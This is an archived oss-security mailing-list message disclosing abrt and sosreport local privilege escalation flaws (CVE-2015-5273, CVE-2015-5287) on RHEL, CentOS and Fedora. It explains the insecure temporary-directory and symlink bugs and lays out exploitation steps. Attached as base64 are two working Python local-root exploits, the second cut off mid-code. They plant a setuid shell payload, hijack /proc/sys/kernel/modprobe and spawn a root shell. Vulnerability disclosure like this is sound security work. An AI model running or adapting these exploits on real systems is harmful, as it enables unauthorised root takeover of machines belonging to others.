X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["19930" "Tuesday" "1" "December" "2015" "10:11:28" "+0900" "Philip Pettersson" "philip.pettersson@gmail.com" "<CAHQ_-nRjvFLeL0VJCA=bVWUyBc4W=2My7iGFiqUWy5wM8411kQ@mail.gmail.com>" "383" "[oss-security] CVE-2015-5273 + CVE-2015-5287, abrt local root in Centos/Fedora/RHEL" nil nil nil "12" "2015120101:11:28" "[oss-security] CVE-2015-5273 + CVE-2015-5287, abrt local root in Centos/Fedora/RHEL" (number mark "U       philip.pette Dec  1  383/19930 " thread-indent "\"[oss-security] CVE-2015-5273 + CVE-2015-5287, abrt local root in Centos/Fedora/RHEL\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3529 invoked by uid 550); 1 Dec 2015 01:11:53 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 3439 invoked from network); 1 Dec 2015 01:11:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20120113;
        h=mime-version:date:message-id:subject:from:to:content-type;
        bh=or5rdiHEunoibB26/js7eFey9GuKycGurUGPYdZ3eqk=;
        b=GVGPuUFVT4oHq2xLrKUoPJA14EoQ5iliLWdYLORUWKQ5aR7VGh+K4QaAsMwT5B4nEJ
         h5Py9RMv24wlwUaMWsrs2m0NlI5AW0T4suoUfm3Hl9c0fgFuM9qqUSXXqdbA92A0fPSN
         WAtLN6Iy/+QIhFrjPsaEg5kA+QcpHinsI5i89Jv/nMhAMwsin26Z86Q7h+DL7k9q6ZRP
         FEG32jnlnaROxkRsAlTkaqLMlL//cwPekiY+yT2qdRG4BH8pl7bFsezrjJmdTnX/Gj6k
         ZfIHh0LFifsAHxZrMeoSHuyWALwoQvQ9yXYUdfhF2A0MbcxWKb2eEe1xu9ubJ3LZvrRo
         gDAw==
MIME-Version: 1.0
X-Received: by 10.28.86.196 with SMTP id k187mr31194385wmb.61.1448932288539;
 Mon, 30 Nov 2015 17:11:28 -0800 (PST)
Date: Tue, 1 Dec 2015 10:11:28 +0900
Message-ID: <CAHQ_-nRjvFLeL0VJCA=bVWUyBc4W=2My7iGFiqUWy5wM8411kQ@mail.gmail.com>
From: Philip Pettersson <philip.pettersson@gmail.com>
To: oss-security@lists.openwall.com
Content-Type: multipart/mixed; boundary=001a11452ca85cd2530525cbd6c7
Subject: [oss-security] CVE-2015-5273 + CVE-2015-5287, abrt local root in Centos/Fedora/RHEL

--001a11452ca85cd2530525cbd6c7
Content-Type: text/plain; charset=UTF-8

Hi,

Here's a slightly delayed advisory about CVE-2015-5273 and CVE-2015-5287 that
I reported to Redhat in September. The patches were released on 2015-11-23.

These are issues concerning the abrt crash handling ecosystem in
Redhat-based distros.

I've attached two local root exploits for CentOS 7.1/Fedora 22 and RHEL 7.0/7.1.

Overview
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*

A) CVE-2015-5287 (?), Insecure temporary directory and symlink usage
in sosreport
B) CVE-2015-5273, Insecure temporary directory usage in
abrt-action-install-debuginfo-to-abrt-cache
C) CVE-2015-5287, Insecure symlink handling in abrt-hook-ccpp

A can be used to elevate privileges from an unprivileged user to root
on a default installation of RHEL 7/7.1. RHEL 6 and lower do not seem
vulnerable by default.

B can be used to create symlinks and files at arbitrary locations as
the abrt user. This only works on non-redhat systems such as CentOS 7 or
RHEL installations that do not use the official RHN yum repositories.

C can be used to elevate privileges from the abrt user to root.

B combined with C can be used to gain root from an unprivileged user.


Insecure temporary directory and symlink usage in sosreport, CVE-2015-5287 (?)
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*

Redhat did not give a separate CVE for this issue so it falls under
CVE-2015-5287
I suppose.

When a process receives SIGSEGV, abrt will save diagnostic information in
/var/tmp/abrt/ccpp-*$pid on RHEL 7. Unless /etc/abrt/abrt.conf contains
the line "PrivateReports = yes", directories created here by abrt will be
chown()'d to the user who owned the crashing process. After saving some
initial information it will call post-create scripts, one of the default
ones on RHEL is /usr/sbin/sosreport.

/usr/sbin/sosreport will be invoked as root and work with a temporary
directory named /var/tmp/abrt/ccpp-*$pid/sosreport-$hostname-$date.
It will save a number of files collected from the system in this directory
and then archive it. Since the directory is owned by root we cannot
modify files inside it while sosreport is running, but we do own the parent
directory and can simply rename the temporary directory and make a new one.

sosreport will then write files into our crafted temp directory and will
follow any symlinks we make inside. By also renaming some of the temporary
files that sosreport works with we can exploit sosreport to write a file
with crafted data at an arbitrary location as root.

See sosreport-rhel7.py for an exploit demonstrating this vulnerability.

I confirmed that RHEL 7 and 7.1 are vulnerable by default. RHEL 6 systems
will be vulnerable if the system administrator has commented out the line
"PrivateReports = yes" or set it to "no" in abrt.conf


Insecure temporary directory usage in
abrt-action-install-debuginfo-to-abrt-cache, CVE-2015-5273
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*

abrt-action-install-debuginfo-to-abrt-cache is a wrapper for
abrt-action-install-debuginfo
with the setuid bit for userid abrt. By default it creates a temporary
directory in
/var/tmp/abrt-tmp-debuginfo-RANDOM_SUFFIX and downloads debug rpm
files to this location
before extracting them to /var/cache/abrt-di. The random suffix is not
quite random but in fact
highly predictable, and we can create this directory before executing
the suid wrapper.

By controlling the "unpacked.cpio" file we can trick
abrt-action-install-debuginfo into extracting
a cpio file that we control. By extracting two carefully created cpio
archives we can leverage
this to create files or symlinks anywhere on the file system as the abrt user.


Insecure symlink handling in abrt-hook-ccpp, CVE-2015-5287
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*

If a program starting with the name "abrt" crashes, abrt-hook-ccpp
will write the coredump to
/var/tmp/abrt/$filename-coredump or /var/spool/abrt/$filename-coredump.
>From abrt-hook-ccpp.c:

    if (last_slash && strncmp(++last_slash, "abrt", 4) == 0)
    {
        /* If abrtd/abrt-foo crashes, we don't want to create a _directory_,
         * since that can make new copy of abrtd to process it,
         * and maybe crash again...
         * Unlike dirs, mere files are ignored by abrtd.
         */
        if (snprintf(path, sizeof(path), "%s/%s-coredump",
g_settings_dump_location, last_slash) >= sizeof(path))
            error_msg_and_die("Error saving '%s': truncated long file
path", path);

        int abrt_core_fd = xopen3(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);

The call to xopen3() does not include the flag O_NOFOLLOW and is
therefore vulnerable to a symlink
attack. We can use the following steps to exploit this:

1. Create a symlink to /proc/sys/kernel/modprobe from
/var/{spool,tmp}/abrt/abrt-test-coredump
    * Note that we can use the previous vulnerability to achieve this
since the abrt root
      directory can be written to as the abrt user.
2. Execute a binary at /tmp/abrt-test and send it SIGSEGV
3. abrt-hook-ccpp will write the memory contents of the crashed
process to /proc/sys/kernel/modprobe

See abrt-centos-fedora.py for an example exploit for this.

This bug is also exploitable on RHEL installations if the system is
configured to use non-RHN yum
repositories. This is because yum is normally not usable by non-root
users if the only configured
repositories are RHN.

References
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
https://access.redhat.com/security/cve/CVE-2015-5273
https://access.redhat.com/security/cve/CVE-2015-5287

Credits
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*
Philip Pettersson

--001a11452ca85cd2530525cbd6c7
Content-Type: text/x-python; charset=US-ASCII; name="sosreport-rhel7.py"
Content-Disposition: attachment; filename="sosreport-rhel7.py"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_ihmosbb20

IyEvdXNyL2Jpbi9weXRob24KIyBDVkUtMjAxNS01Mjg3ICg/KQojIGFicnQv
c29zcmVwb3J0IFJIRUwgNy4wLzcuMSBsb2NhbCByb290CiMgcmViZWwgMDkv
MjAxNQoKIyBbdXNlckBsb2NhbGhvc3Qgfl0kIHB5dGhvbiBzb3NyZXBvcnQt
cmhlbDcucHkKIyBjcmFzaGluZyBwaWQgMTkxNDMKIyB3YWl0aW5nIGZvciBk
dW1wIGRpcmVjdG9yeQojIGR1bXAgZGlyZWN0b3J5OiAgL3Zhci90bXAvYWJy
dC9jY3BwLTIwMTUtMTEtMzAtMTk6NDE6MTMtMTkxNDMKIyB3YWl0aW5nIGZv
ciBzb3NyZXBvcnQgZGlyZWN0b3J5CiMgc29zcmVwb3J0OiAgc29zcmVwb3J0
LWxvY2FsaG9zdC5sb2NhbGRvbWFpbi0yMDE1MTEzMDE5NDExNAojIHdhaXRp
bmcgZm9yIHRtcGZpbGVzCiMgdG1wZmlsZXM6ICBbJ3RtcHVyZnB5WScsICd0
bXBZbkNmblEnXQojIG1vdmluZyBkaXJlY3RvcnkKIyBtb3ZpbmcgdG1wZmls
ZXMKIyB0bXB1cmZweVkgLT4gdG1wdXJmcHlZLm9sZAojIHRtcFluQ2ZuUSAt
PiB0bXBZbkNmblEub2xkCiMgd2FpdGluZyBmb3Igc29zcmVwb3J0IHRvIGZp
bmlzaCAoY2FuIHRha2Ugc2V2ZXJhbCBtaW51dGVzKS4uLi4uLi4uLi4uLi4u
Li4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi5kb25lCiMgc3VjY2VzcwojIGJh
c2gtNC4yIyBpZAojIHVpZD0wKHJvb3QpIGdpZD0xMDAwKHVzZXIpIGdyb3Vw
cz0wKHJvb3QpLDEwMDAodXNlcikgY29udGV4dD11bmNvbmZpbmVkX3U6dW5j
b25maW5lZF9yOnVuY29uZmluZWRfdDpzMC1zMDpjMC5jMTAyMwojIGJhc2gt
NC4yIyBjYXQgL2V0Yy9yZWRoYXQtcmVsZWFzZSAKIyBSZWQgSGF0IEVudGVy
cHJpc2UgTGludXggU2VydmVyIHJlbGVhc2UgNy4xIChNYWlwbykKCmltcG9y
dCBvcyxzeXMsZ2xvYix0aW1lLHN5cyxzb2NrZXQKCnBheWxvYWQgPSAiIyEv
YmluL3NoXG5jcCAvYmluL3NoIC90bXAvc2hcbmNobW9kIDY3NTUgL3RtcC9z
aFxuIgoKcGlkID0gb3MuZm9yaygpCgppZiBwaWQgPT0gMDoKCW9zLmV4ZWNs
KCIvdXNyL2Jpbi9zbGVlcCIsInNsZWVwIiwiMTAwIikKCnRpbWUuc2xlZXAo
MC41KQoKcHJpbnQgImNyYXNoaW5nIHBpZCAlZCIgJSBwaWQKCm9zLmtpbGwo
cGlkLDExKQoKcHJpbnQgIndhaXRpbmcgZm9yIGR1bXAgZGlyZWN0b3J5IgoK
ZGVmIHdhaXRwYXRoKHApOgoJd2hpbGUgMToKCQlyID0gZ2xvYi5nbG9iKHAp
CgkJaWYgbGVuKHIpID4gMDoKCQkJcmV0dXJuIHIKCQl0aW1lLnNsZWVwKDAu
MDUpCQoKZHVtcGRpciA9IHdhaXRwYXRoKCIvdmFyL3RtcC9hYnJ0L2NjKiVk
IiAlIHBpZClbMF0KCnByaW50ICJkdW1wIGRpcmVjdG9yeTogIiwgZHVtcGRp
cgoKb3MuY2hkaXIoZHVtcGRpcikKCnByaW50ICJ3YWl0aW5nIGZvciBzb3Ny
ZXBvcnQgZGlyZWN0b3J5IgoKc29zcmVwb3J0ID0gd2FpdHBhdGgoInNvc3Jl
cG9ydC0qIilbMF0KCnByaW50ICJzb3NyZXBvcnQ6ICIsIHNvc3JlcG9ydAoK
cHJpbnQgIndhaXRpbmcgZm9yIHRtcGZpbGVzIgp0bXBmaWxlcyA9IHdhaXRw
YXRoKCJ0bXAqIikKCnByaW50ICJ0bXBmaWxlczogIiwgdG1wZmlsZXMKCnBy
aW50ICJtb3ZpbmcgZGlyZWN0b3J5IgoKb3MucmVuYW1lKHNvc3JlcG9ydCwg
c29zcmVwb3J0ICsgIi5vbGQiKQpvcy5ta2Rpcihzb3NyZXBvcnQpCm9zLmNo
bW9kKHNvc3JlcG9ydCwwNzc3KQoKb3MubWtkaXIoc29zcmVwb3J0ICsgIi9z
b3NfbG9ncyIpCm9zLmNobW9kKHNvc3JlcG9ydCArICIvc29zX2xvZ3MiLDA3
NzcpCgpvcy5zeW1saW5rKCIvcHJvYy9zeXMva2VybmVsL21vZHByb2JlIixz
b3NyZXBvcnQgKyAiL3Nvc19sb2dzL3Nvcy5sb2ciKQpvcy5zeW1saW5rKCIv
cHJvYy9zeXMva2VybmVsL21vZHByb2JlIixzb3NyZXBvcnQgKyAiL3Nvc19s
b2dzL3VpLmxvZyIpCgpwcmludCAibW92aW5nIHRtcGZpbGVzIgoKZm9yIHgg
aW4gdG1wZmlsZXM6CglwcmludCAiJXMgLT4gJXMiICUgKHgseCArICIub2xk
IikKCW9zLnJlbmFtZSh4LCB4ICsgIi5vbGQiKQoJb3Blbih4LCAidysiKS53
cml0ZSgiL3RtcC9oYXguc2hcbiIpCglvcy5jaG1vZCh4LDA2NjYpCgoKb3Mu
Y2hkaXIoIi8iKQoKc3lzLnN0ZGVyci53cml0ZSgid2FpdGluZyBmb3Igc29z
cmVwb3J0IHRvIGZpbmlzaCAoY2FuIHRha2Ugc2V2ZXJhbCBtaW51dGVzKS4u
IikKCgpkZWYgdHJpZ2dlcigpOgoJb3BlbigiL3RtcC9oYXguc2giLCJ3KyIp
LndyaXRlKHBheWxvYWQpCglvcy5jaG1vZCgiL3RtcC9oYXguc2giLDA3NTUp
Cgl0cnk6IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNP
Q0tfU1RSRUFNLDEzMikKCWV4Y2VwdDogcGFzcwoJdGltZS5zbGVlcCgwLjUp
Cgl0cnk6CgkJb3Muc3RhdCgiL3RtcC9zaCIpCglleGNlcHQ6CgkJcHJpbnQg
ImNvdWxkIG5vdCBjcmVhdGUgc3VpZCIKCQlzeXMuZXhpdCgtMSkKCXByaW50
ICJzdWNjZXNzIgoJb3MuZXhlY2woIi90bXAvc2giLCJzaCIsIi1wIiwiLWMi
LCcnJ2VjaG8gL3NiaW4vbW9kcHJvYmUgPiAvcHJvYy9zeXMva2VybmVsL21v
ZHByb2JlO3JtIC1mIC90bXAvc2g7cHl0aG9uIC1jICJpbXBvcnQgb3M7b3Mu
c2V0cmVzdWlkKDAsMCwwKTtvcy5leGVjbCgnL2Jpbi9iYXNoJywnYmFzaCcp
OyInJycpCglzeXMuZXhpdCgtMSkKCmZvciB4IGluIHhyYW5nZSgwLDYwKjEw
KToKCWlmICIvdG1wL2hheCIgaW4gb3BlbigiL3Byb2Mvc3lzL2tlcm5lbC9t
b2Rwcm9iZSIpLnJlYWQoKToKCQlwcmludCAiZG9uZSIKCQl0cmlnZ2VyKCkK
CXRpbWUuc2xlZXAoMSkKCXN5cy5zdGRlcnIud3JpdGUoIi4iKQoKcHJpbnQg
InRpbWVkIG91dCIK

--001a11452ca85cd2530525cbd6c7
Content-Type: text/x-python; charset=US-ASCII; name="abrt-centos-fedora.py"
Content-Disposition: attachment; filename="abrt-centos-fedora.py"
Content-Transfer-Encoding: base64
X-Attachment-Id: f_ihmosbd31

IyEvdXNyL2Jpbi9weXRob24KIyBDVkUtMjAxNS01MjczICsgQ1ZFLTIwMTUt
NTI4NwojIENFTlRPUyA3LjEvRmVkb3JhMjIgbG9jYWwgcm9vdCAocHJvYmFi
bHkgd29ya3Mgb24gU0wgYW5kIG9sZGVyIHZlcnNpb25zIHRvbykKIyBhYnJ0
LWhvb2stY2NwcCBpbnNlY3VyZSBvcGVuKCkgdXNhZ2UgKyBhYnJ0LWFjdGlv
bi1pbnN0YWxsLWRlYnVnaW5mbyBpbnNlY3VyZSB0ZW1wIGRpcmVjdG9yeSB1
c2FnZQojIHJlYmVsIDA5LzIwMTUKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0t
LS0tLS0tLS0tLS0tLS0tLS0tCgojIFt1c2VyQGxvY2FsaG9zdCB+XSQgaWQK
IyB1aWQ9MTAwMCh1c2VyKSBnaWQ9MTAwMCh1c2VyKSBncm91cHM9MTAwMCh1
c2VyKSBjb250ZXh0PXVuY29uZmluZWRfdTp1bmNvbmZpbmVkX3I6dW5jb25m
aW5lZF90OnMwLXMwOmMwLmMxMDIzCiMgW3VzZXJAbG9jYWxob3N0IH5dJCBj
YXQgL2V0Yy9yZWRoYXQtcmVsZWFzZSAKIyBDZW50T1MgTGludXggcmVsZWFz
ZSA3LjEuMTUwMyAoQ29yZSkgCiMgW3VzZXJAbG9jYWxob3N0IH5dJCBweXRo
b24gYWJydC1jZW50b3MtZmVkb3JhLnB5CiMgLS0gbG90cyBvZiBib3Jpbmcg
b3V0cHV0LCBtaWdodCB0YWtlIGEgd2hpbGUgb24gYSBzbG93IGNvbm5lY3Rp
b24gLS0KIyAvdmFyL3Nwb29sL2FicnQvYWJydC1oYXgtY29yZWR1bXAgY3Jl
YXRlZAojIGV4ZWN1dGluZyBjcmFzaGluZyBwcm9jZXNzLi4KIyBzdWNjZXNz
CiMgYmFzaC00LjIjIGlkCiMgdWlkPTAocm9vdCkgZ2lkPTEwMDAodXNlcikg
Z3JvdXBzPTAocm9vdCksMTAwMCh1c2VyKSBjb250ZXh0PXVuY29uZmluZWRf
dTp1bmNvbmZpbmVkX3I6dW5jb25maW5lZF90OnMwLXMwOmMwLmMxMDIzCgoK
aW1wb3J0IHRpbWUsb3MsZGF0ZXRpbWUsc3lzLHJlc291cmNlLHNvY2tldAoK
CmZlZG9yYSA9ICJGZWRvcmEiIGluIG9wZW4oIi9ldGMvcmVkaGF0LXJlbGVh
c2UiKS5yZWFkKCkKCiMgbWtkaXIgZGlyMQojIGxuIC1zIC92YXIvc3Bvb2wv
YWJydCBkaXIxL2hheAojIG1rZGlyIGRpcjIKIyBta2RpciBkaXIyL2hheAoj
IGxuIC1zIC9wcm9jL3N5cy9rZXJuZWwvbW9kcHJvYmUgZGlyMi9oYXgvYWJy
dC1oYXgtY29yZWR1bXAKIyBjZCBkaXIxCiMgZmluZCAuIC1kZXB0aCAtcHJp
bnQgfCBjcGlvIC1vID4gLi4vY3BpbzEKIyBjZCAuLi9kaXIyCiMgZmluZCAu
IC1kZXB0aCAtcHJpbnQgfCBjcGlvIC1vID4gLi4vY3BpbzIKCmNwaW8xID0g
J3hceDljO15ceGM4XHhjY1x4YTFceGIwXHhlZlx4ZmZceGMyXHgxN1x4Y2Mv
XHg5OFx4MTlceDE5XHgxOFx4MTg+XHg4Nlx4ZGVceGRjXHhjOFx4MDJceGE0
XHhmOVx4MTkyXHgxMitceDE4XHhmNFx4Y2JceDEyXHg4Ylx4ZjRceDhiXHgw
Ylx4ZjJceGYzc1x4ZjRceDEzXHg5M1x4OGFKXHgxOFx4OGVceDAzVVx4YjNc
eGVmXHhmYlx4ZWJceDA4Ulx4Y2RceDA0VVxyXHhhMlx4MTlceDE4XHhmNFx4
ODByXHgwY3BceGMwXHgwOFx4YTVceGI5XHhjMWRIXHg5MFx4YTNceGE3XHg4
ZmtceDkwXHhhMlx4YTIiXHhjMyhceDE4ZFx4MDBceDAwXHgxNlx4YjlceDFi
QScuZGVjb2RlKCJ6aXAiKQpjcGlvMiA9ICd4XHg5YzteXHhjOFx4Y2NceDkx
N1x4ZmJceGZmXHhjMlx4MTdceGNjL1x4OThceDE5XHgxOVx4MThceDE4Plx4
ODZceGRlXHhkYyhceDA2XHhhNCVceDE5Mlx4MTIrXHhmNFx4MTNceDkzXHg4
YUp0XHg4MVx4MGNceGRkXHhlNFx4ZmNceGEyXHhkNFx4OTRceGQyXHhkY1x4
MDJceDA2XHhmZFx4ODJceGEyXHhmY2RceGZkXHhlMlx4Y2FiXHhmZFx4ZWNc
eGQ0XHhhMlx4YmNceGQ0XHgxY1x4ZmRceGRjXHhmY1x4MTRceGEwUFIqXHhj
M3FceGEwSVx4MTlceGIzXHhmZjpceDgyTGJceDgyXHg5YVx4YzRceGMyXHgw
MFx4MDJAXHgwM1x4YzBceGIyK1x4ZWZAZFx4OTlceGExXHhiMkxgWT1ceGEw
XHgxY1x4MDNceDFjMEJpbjBceDE5XHgxMlx4ZTRceGU4XHhlOVx4ZTNceDFh
XHhhNFx4YThceGE4XHhjODBcbmhceDAyXHgwMFx4MDFceDk4MFx4ODgnLmRl
Y29kZSgiemlwIikKCmlmIGZlZG9yYToKCWNwaW8xID0gY3BpbzEucmVwbGFj
ZSgiL3Zhci9zcG9vbC9hYnJ0IiwiL3Zhci90bXAvLy9hYnJ0IikKCnBheWxv
YWQgPSAiIyEvYmluL3NoXG5jcCAvYmluL3NoIC90bXAvc2hcbmNobW9kIDY3
NTUgL3RtcC9zaFxuIgoKCiMgd2UgdXNlIGEgMzIgYml0IGJpbmFyeSBiZWNh
dXNlIFt2c3lzY2FsbF0gd2lsbCBiZSBhdCB0aGUgZW5kIG9mIHRoZSBjb3Jl
ZHVtcCBvbiA2NCBiaXQgYmluYXJpZXMKIyBhbmQgd2UgY2FuJ3QgY29udHJv
bCB0aGUgY29udGVudHMgb2YgdGhhdCByZWdpb24uIG9uIDMyIGJpdCBiaW5h
cmllcyBbc3RhY2tdIGlzIGF0IHRoZSBlbmQKCiMgdGhlIGNyYXNoaW5nIGJp
bmFyeSB3aWxsIGp1c3QgZmlsbCB0aGUgc3RhY2sgd2l0aCAvdG1wL2hheC5z
aCB3aGljaCBzdWJzZXF1ZW50bHkgZ2V0cyB3cml0dGVuCiMgdG8gL3Byb2Mv
c3lzL2tlcm5lbC9tb2Rwcm9iZSBieSAvdXNyL2xpYmV4ZWMvYWJydC1ob29r
LWNjcHAKCmVsZiA9ICd4XHg5Y1x4YWJ3XHhmNXFjZGRkXHg4MFx4MDEmXHgw
NmZceDA2XHgxMC9ceGE0XHg4MVx4ODVceGMzXHg4NFx4MDFceDAxTFx4MThc
eDE0XHgxOGBceGFhXHhlMFx4YWFceDgxakB4MVx4OTBcdFx4YzJceGFjIDFc
eDAxXHgwNlx4MDZceDk3Rlx4MWJceDE1XHhmZFx4OTJceGRjXHg4Mlx4ZDJv
XHg4ZGdceGZlXHhmM1x4MDNceGY5XHhiYlx4YmVceDAwXHhiNVx4ZWNceDE0
XHgwMVx4Y2FceGVlXHhlZVx4MDdceGFhXHhkNzxceGQzXHhjNVx4ZGNceGMx
XHhhMlx4ZTJceGUyXHhmY1x4ZTh7XHhmM1x4MWJceDExXHhhZlx4ZTZfXHgw
Y1x4YTVceDhmdjhceDAyXHhjMVx4ZmZceDA3XHhmYVBceDAwXHhkNFx4YWRc
eDlmXHg5MVhceGExV1x4OWNceGMxXHhjNVx4MDBceDAwLWYiWCcuZGVjb2Rl
KCJ6aXAiKQoKIyBtb3N0IHBlb3BsZSBkb24ndCBoYXZlIG5hc20gaW5zdGFs
bGVkIHNvIGkgcHJlYXNzZW1ibGVkIGl0CiMgaWYgeW91J3JlIG5vdCBicmF2
ZSBlbm91Z2ggdG8gcnVuIHRoZSBwcmVhc3NlbWJsZWQgZmlsZSwgaGVyZSdz
IHRoZSBjb2RlIDopCgoiIiIKOyBhYnJ0LWhheC5hc20KOyBuYXNtIC1mIGJp
biAtbyBhYnJ0LWhheCBhYnJ0LWhheC5hc20KQklUUyAzMgogICAgICAgICAg
ICAgICAgb3JnICAgICAweDA4MDQ4MDAwCmVoZHI6ICAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsgRWxmMzJfRWhk
cgogICAgICAgICAgICAgICAgZGIgICAgICAweDdGLCAiRUxGIiwgMSwgMSwg
MSwgMCAgICAgICAgIDsgICBlX2lkZW50CiAgICAgICAgdGltZXMgOCBkYiAg
ICAgIDAKICAgICAgICAgICAgICAgIGR3ICAgICAgMiAgICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICA7ICAgZV90eXBlCiAgICAgICAgICAgICAgICBk
dyAgICAgIDMgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyAgIGVf
bWFjaGluZQogICAgICAgICAgICAgICAgZGQgICAgICAxICAgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgIDsgICBlX3ZlcnNpb24KICAgICAgICAgICAg
ICAgIGRkICAgICAgX3N0YXJ0ICAgICAgICAgICAgICAgICAgICAgICAgICA7
ICAgZV9lbnRyeQogICAgICAgICAgICAgICAgZGQgICAgICBwaGRyIC0gJCQg
ICAgICAgICAgICAgICAgICAgICAgIDsgICBlX3Bob2ZmCiAgICAgICAgICAg
ICAgICBkZCAgICAgIDAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
OyAgIGVfc2hvZmYKICAgICAgICAgICAgICAgIGRkICAgICAgMCAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICA7ICAgZV9mbGFncwogICAgICAgICAg
ICAgICAgZHcgICAgICBlaGRyc2l6ZSAgICAgICAgICAgICAgICAgICAgICAg
IDsgICBlX2Voc2l6ZQogICAgICAgICAgICAgICAgZHcgICAgICBwaGRyc2l6
ZSAgICAgICAgICAgICAgICAgICAgICAgIDsgICBlX3BoZW50c2l6ZQogICAg
ICAgICAgICAgICAgZHcgICAgICAxICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIDsgICBlX3BobnVtCiAgICAgICAgICAgICAgICBkdyAgICAgIDAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgOyAgIGVfc2hlbnRzaXpl
CiAgICAgICAgICAgICAgICBkdyAgICAgIDAgICAgICAgICAgICAgICAgICAg
ICAgICAgICAgICAgOyAgIGVfc2hudW0KICAgICAgICAgICAgICAgIGR3ICAg
ICAgMCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7ICAgZV9zaHN0
cm5keAogIGVoZHJzaXplICAgICAgZXF1ICAgICAkIC0gZWhkcgogIHBoZHI6
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgIDsgRWxmMzJfUGhkcgogICAgICAgICAgICAgICAgZGQgICAgICAxICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgIDsgICBwX3R5cGUKICAgICAg
ICAgICAgICAgIGRkICAgICAgMCAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICA7ICAgcF9vZmZzZXQKICAgICAgICAgICAgICAgIGRkICAgICAgJCQg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7ICAgcF92YWRkcgogICAg
ICAgICAgICAgICAgZGQgICAgICAkJCAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAgIDsgICBwX3BhZGRyCiAgICAgICAgICAgICAgICBkZCAgICAgIGZp
bGVzaXplICAgICAgICAgICAgICAgICAgICAgICAgOyAgIHBfZmlsZXN6CiAg
ICAgICAgICAgICAgICBkZCAgICAgIGZpbGVzaXplICAgICAgICAgICAgICAg
ICAgICAgICAgOyAgIHBfbWVtc3oKICAgICAgICAgICAgICAgIGRkICAgICAg
NSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA7ICAgcF9mbGFncwog
ICAgICAgICAgICAgICAgZGQgICAgICAweDEwMDAgICAgICAgICAgICAgICAg
ICAgICAgICAgIDsgICBwX2FsaWduCiAgcGhkcnNpemUgICAgICBlcXUgICAg
ICQgLSBwaGRyCgpfc3RhcnQ6CmluYyBlc3AKY21wIGR3b3JkIFtlc3BdLDB4
NzA2ZDc0MmYKam5lIGwKb3IgZXNwLDB4ZmZmCmluYyBlc3AKbW92IGVkeCw1
MDAKbDM6Cm1vdiBlY3gsbXNnbGVuCm1vdiBlYngsbWVzc2FnZQpzdWIgZXNw
LGVjeApsMjoKbW92IGFsLFtlYnhdCm1vdiBbZXNwXSxhbAppbmMgZXNwCmlu
YyBlYngKbG9vcCBsMgpzdWIgZXNwLG1zZ2xlbgpkZWMgZWR4CmNtcCBlZHgs
MApqbmUgbDMKbW92IGVheCwweDQxNDE0MTQxCmptcCBlYXgKbWVzc2FnZSAg
ICAgICAgIGRiICAgICAgJy8vLy8vLy8vdG1wL2hheC5zaCcsMHgwYSwwCm1z
Z2xlbiAgICAgICAgICBlcXUgICAgICQtbWVzc2FnZQoiIiIKCgoKYnVpbGRf
aWQgPSBvcy5wb3BlbigiZXUtcmVhZGVsZiAtbiAvdXNyL2Jpbi9ob3N0bmFt
ZSIpLnJlYWRsaW5lcygpWy0xXS5zcGxpdCgpWy0xXQoKb3MuY2hkaXIoIi90
bXAiKQoKCm9wZW4oImJ1aWxkX2lkcyIsIncrIikud3JpdGUoYnVpbGRfaWQg
KyAiXG4iKQoKcHJpbnQgYnVpbGRfaWQKCgpkZWYgY2hpbGQoKToKCXRpbWVz
dGFtcCA9IGludCh0aW1lLnRpbWUoKSkKCglmb3IgaSBpbiB4cmFuZ2UoMCwz
KToKCQl0cnk6CgkJCXQgPSBkYXRldGltZS5kYXRldGltZS5mcm9tdGltZXN0
YW1wKHRpbWVzdGFtcCtpKQoJCQlkID0gIi92YXIvdG1wL2FicnQtdG1wLWRl
YnVnaW5mby0lcy4ldSIgJSAodC5zdHJmdGltZSgiJVktJW0tJWQtJUg6JU06
JVMiKSwgb3MuZ2V0cGlkKCkpCgkJCW9zLm1rZGlyKGQpCgkJCW9zLmNobW9k
KGQsMDc3NykKCQkJb3Muc3ltbGluaygiL3Zhci90bXAvaGF4ZmlmbyIsZCsi
